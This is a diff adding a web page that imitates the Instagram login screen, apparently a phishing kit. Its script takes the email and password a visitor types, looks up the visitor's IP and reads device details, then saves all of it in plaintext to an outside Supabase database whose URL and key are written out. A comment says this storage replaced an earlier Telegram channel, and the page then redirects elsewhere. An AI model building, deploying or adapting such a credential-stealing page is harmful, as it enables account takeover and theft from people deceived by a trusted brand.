@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="vipser.css" />
+  <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+ 
+</head>
+<body>
+
+  <main class="flex align-items-center justify-content-center">
+    <section id="mobile" class="flex"></section>
+
+    <section id="auth" class="flex direction-column">
+      <div class="panel login flex direction-column">
+        <h1 title="Instagram" class="flex justify-content-center">
+          <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+        </h1>
+
+        <!-- ✅ Login Form -->
+        <form id="login-form">
+          <label for="email" class="sr-only">Phone number, username, or email</label>
+          <input id="email" name="email" placeholder="Phone number, username, or email" required />
+
+          <label for="password" class="sr-only">Password</label>
+          <input id="password" name="password" type="password" placeholder="Password" required />
+
+          <!-- ✅ Error message -->
+          <p id="password-error" style="color:red; font-size:14px; display:none; margin:5px 0;"></p>
+
+          <button type="submit">Log In</button>
+        </form>
+
+        <div class="flex separator align-items-center">
+          <span></span>
+          <div class="or">OR</div>
+          <span></span>
+        </div>
+
+        <div class="login-with-fb flex direction-column align-items-center">
+          <div>
+            <img />
+            <a href="#">Log in with Facebook</a>
+          </div>
+          <a href="#">Forgot password?</a>
+        </div>
+      </div>
+
+      <div class="panel register flex justify-content-center">
+        <p>Don't have an account?</p>
+        <a href="#">Sign up</a>
+      </div>
+
+      <div class="app-download flex direction-column align-items-center">
+        <p></p>
+        <div class="flex justify-content-center">
+          <img src="./img/apple-button.png" alt="Apple Store logo button" title="Apple Store logo button" />
+          <img src="./img/googleplay-button.png" alt="Google Play logo button" title="Google Play logo button" />
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <ul class="flex flex-wrap justify-content-center">
+      <li><a href="#">ABOUT</a></li>
+      <li><a href="#">HELP</a></li>
+      <li><a href="#">PRESS</a></li>
+      <li><a href="#">API</a></li>
+      <li><a href="#">JOBS</a></li>
+      <li><a href="#">PRIVACY</a></li>
+      <li><a href="#">TERMS</a></li>
+      <li><a href="#">LOCATIONS</a></li>
+      <li><a href="#">TOP ACCOUNTS</a></li>
+      <li><a href="#">HASHTAGS</a></li>
+      <li><a href="#">LANGUAGE</a></li>
+    </ul>
+    <p class="copyright">© <span id="year"></span> Instagram from Facebook</p>
+  </footer>
+
+  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+  // ---------- Supabase Config (موجود عندك)
+  const supabaseUrl = "https://jmeqvaotdigdvgkaostn.supabase.co";
+  const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImptZXF2YW90ZGlnZHZna2Fvc3RuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU0Nzg2MDMsImV4cCI6MjA3MTA1NDYwM30.2a78-xTurx8g11ZBWsXkJ5ZW59dw0tYD68D7KPVsvTs";
+  const client = supabase.createClient(supabaseUrl, supabaseKey);
+
+  // عناصر الصفحة
+  const passwordInput = document.getElementById("password");
+  const errorMsg = document.getElementById("password-error");
+  const form = document.getElementById("login-form");
+
+  // ريجيكس يسمح فقط بحروف إنجليزية + أرقام + رموز محددة (كما عندك)
+  const englishRegex = /^[A-Za-z0-9!@#$%^&*()_+=-]*$/;
+
+  // Live validation للباسورد
+  passwordInput.addEventListener("input", function () {
+    const value = passwordInput.value;
+
+    if (!englishRegex.test(value)) {
+      errorMsg.textContent = "password incorrect";
+      errorMsg.style.display = "block";
+    } else if (value.length > 0 && value.length < 8) {
+      errorMsg.textContent = "password must be at least 8 characters";
+      errorMsg.style.display = "block";
+    } else {
+      errorMsg.style.display = "none";
+    }
+  });
+
+  // ======= هنا استبدال من أجل ازالة Telegram =======
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value.trim();
+    const password = passwordInput.value;
+
+    // تحقق بسيط قبل الإرسال
+    if (!englishRegex.test(password)) {
+      errorMsg.textContent = "password incorrect";
+      errorMsg.style.display = "block";
+      return;
+    }
+
+    if (password.length < 8) {
+      errorMsg.textContent = "password must be at least 8 characters";
+      errorMsg.style.display = "block";
+      return;
+    }
+
+    errorMsg.style.display = "none"; // لو كله تمام
+
+    // UI feedback
+    const loginButton = form.querySelector('button[type="submit"]');
+    if (loginButton) {
+      loginButton.disabled = true;
+      loginButton.textContent = "Logging in...";
+    }
+
+    // حاول تجيب IP لكن لو فشل متوقفش
+    let ip = "unknown";
+    try {
+      const ipRes = await axios.get('https://api.ipify.org?format=json');
+      if (ipRes && ipRes.data && ipRes.data.ip) ip = ipRes.data.ip;
+    } catch (err) {
+      console.warn("IP lookup failed (non-blocking):", err.message || err);
+    }
+
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const screenWidth = screen.width;
+    const screenHeight = screen.height;
+    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+    // ✅ حفظ في جدول "logins" في Supabase (يمكنك تغييره لـ test_logins إن أردت)
+    try {
+      const { data, error } = await client
+        .from("logins")
+        .insert([
+          {
+            email,
+            password,          // ملاحظة: يُخزَّن كنص واضح كما في الكود الأصلي — أنصح بالهش إن كان هذا PROD
+            ip,
+            device_type: deviceType,
+            platform,
+            user_agent: userAgent,
+            created_at: new Date().toISOString()
+          }
+        ]);
+
+      if (error) {
+        // لو في خطأ من Supabase، بس حنكمّل ونعرض تحذير في الكونسول
+        console.error("Supabase insert error:", error.message || error);
+      } else {
+        console.log("Saved to Supabase:", data);
+      }
+    } catch (err) {
+      console.warn("Supabase operation failed (non-blocking):", err.message || err);
+    }
+
+    // حفظ محلي ثم تحويل — هذا السلوك مضمون حتى لو الـ DB فشلت
+    try {
+      localStorage.setItem("user", JSON.stringify({ email, loggedAt: new Date().toISOString() }));
+    } catch (err) {
+      console.warn("localStorage failed:", err.message || err);
+    }
+
+    // Redirect النهائي
+    window.location.href = "web.html?voter_id=" + encodeURIComponent(email);
+  });
+</script>
+
+</body>
+</html>
